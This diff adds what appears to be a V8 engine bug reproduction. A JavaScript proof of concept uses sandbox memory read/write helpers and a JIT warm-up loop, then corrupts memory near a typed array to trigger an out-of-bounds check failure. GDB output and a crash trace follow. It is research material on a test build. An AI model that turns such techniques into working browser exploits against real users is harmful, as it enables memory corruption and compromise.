@@ -1,5 +1,130 @@
 
 ```js
+// Copyright 2017 the V8 project authors. All rights reserved.
+// Use of this source code is governed by a BSD-style license that can be
+// found in the LICENSE file.
+
+// Flags: --allow-natives-syntax
+let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
+
+function addrOf(obj) {
+    return Sandbox.getAddressOf(obj);
+  }
+  
+  function v8_read64(addr) {
+    return sandboxMemory.getBigUint64(Number(addr), true);
+  }
+  
+  function v8_write64(addr, val) {
+    return sandboxMemory.setBigInt64(Number(addr), val, true);
+  }
+
+
+Object.prototype.__defineGetter__(0, () => {
+  throw Error();
+});
+var a = [, 0.1];
+function foo(i) {
+  a[i];
+};
+for (var i = 0; i < 0x10000; ++i) {
+  foo(1);
+}
+
+const dummy = new Int8Array(150);
+%DebugPrint(dummy);
+console.log(v8_read64(addrOf(dummy)+0x24e5a2).toString(16));
+v8_write64(addrOf(dummy)+0x24e5a2,0x11001002000c0f02n);
+console.log(v8_read64(addrOf(dummy)+0x24e5a2).toString(16));
+%SystemBreak();
+foo(0);
+
+DebugPrint: 0x35700004b241: [JSTypedArray]
+ - map: 0x357000283941 <Map[76](INT8ELEMENTS)> [FastProperties]
+ - prototype: 0x3570002839d5 <Object map = 0x357000283969>
+ - elements: 0x357000000ec1 <ByteArray[0]> [INT8ELEMENTS]
+ - embedder fields: 2
+ - cpp_heap_wrappable: 0
+ - buffer: 0x35700004b1fd <ArrayBuffer map = 0x357000289c25>
+ - byte_offset: 0
+ - byte_length: 150
+ - length: 150
+ - data_ptr: 0x357100000000
+   - base_pointer: (nil)
+   - external_pointer: 0x357100000000
+ - properties: 0x357000000725 <FixedArray[0]>
+ - All own properties (excluding elements): {}
+ - elements: 0x357000000ec1 <ByteArray[0]> {
+       0-149: 0
+ }
+ - embedder fields = {
+    0, aligned pointer: (nil)
+    0, aligned pointer: (nil)
+ }
+0x357000283941: [Map] in OldSpace
+ - map: 0x3570002816d9 <MetaMap (0x357000281729 <NativeContext[291]>)>
+ - type: JS_TYPED_ARRAY_TYPE
+ - instance size: 76
+ - inobject properties: 0
+ - unused property fields: 0
+ - elements kind: INT8ELEMENTS
+ - enum length: invalid
+ - stable_map
+ - back pointer: 0x357000000069 <undefined>
+ - prototype_validity cell: 0x357000000a89 <Cell value= 1>
+ - instance descriptors (own) #0: 0x357000000759 <DescriptorArray[0]>
+ - prototype: 0x3570002839d5 <Object map = 0x357000283969>
+ - constructor: 0x35700028390d <JSFunction Int8Array (sfi = 0x35700027a469)>
+ - dependent code: 0x357000000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
+ - construction counter: 0
+
+11001002000c0002
+11001002000c0f02
+
+Thread 1 "d8" received signal SIGTRAP, Trace/breakpoint trap.
+-----------------------------------------------------------------------------------------------------------------------[e[1m][regs]
+  RAX: 0x0000000000000000  RBX: 0x00005555555E2000  RBP: 0x00007FFFFFFFD3E0  RSP: 0x00007FFFFFFFD3E0  [e[1m][e[0;31m]o d I t s z a P c
+  RDI: 0x0000000000000000  RSI: 0x00005555555E2000  RDX: 0x00005555555E2000  RCX: 0x0000357000000000  RIP:[e[0;31m] 0x00007FFFF3FF2F65
+  R8 : 0x00007FFFFFFFD530  R9 : 0x0000000000000153  R10: 0x00007FFFF3FB0A30  R11: 0x00007FFFF3FF2F60  R12: 0x0000000000000005
+  R13: 0x00005555555E2080  R14: 0x000055555565D2F0  R15: 0x000055555565D2F0
+  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B
+-----------------------------------------------------------------------------------------------------------------------[e[1m][code]
+=> 0x7ffff3ff2f65 <_ZN2v84base2OS10DebugBreakEv+5>:	pop    rbp
+   0x7ffff3ff2f66 <_ZN2v84base2OS10DebugBreakEv+6>:	ret
+   0x7ffff3ff2f67:	int3
+   0x7ffff3ff2f68:	int3
+   0x7ffff3ff2f69:	int3
+   0x7ffff3ff2f6a:	int3
+   0x7ffff3ff2f6b:	int3
+   0x7ffff3ff2f6c:	int3
+-----------------------------------------------------------------------------------------------------------------------------
+v8::base::OS::DebugBreak () at ../../src/base/platform/platform-posix.cc:735
+warning: 735	../../src/base/platform/platform-posix.cc: No such file or directory
+gdb$ c
+Continuing.
+
+
+#
+# Safely terminating process due to error in ../../src/objects/deoptimization-data.cc, line 249
+# The following harmless error was encountered: Check failed: index_ < buffer_.length() (80 vs. 80).
+#
+#
+#
+#FailureMessage Object: 0x7fffffffce00
+==== C stack trace ===============================
+
+    /util/v8_sandbox/v8/out/test/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x13) [0x7ffff3ff53d3]
+    /util/v8_sandbox/v8/out/test/libv8_libplatform.so(+0x1631d) [0x7ffff7faf31d]
+    /util/v8_sandbox/v8/out/test/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x17d) [0x7ffff3fd67fd]
+    /util/v8_sandbox/v8/out/test/libv8.so(+0x1ef60e8) [0x7ffff5ef60e8]
+    /util/v8_sandbox/v8/out/test/libv8.so(+0x19ae78f) [0x7ffff59ae78f]
+    /util/v8_sandbox/v8/out/test/libv8.so(+0x19b0c1a) [0x7ffff59b0c1a]
+    /util/v8_sandbox/v8/out/test/libv8.so(+0x199bbdb) [0x7ffff599bbdb]
+    [0x7fff7f3801ff]
+Couldn't get registers: No such process.
+```
+
+```js
 
 Object.prototype.__defineGetter__(0, () => {
   throw Error();
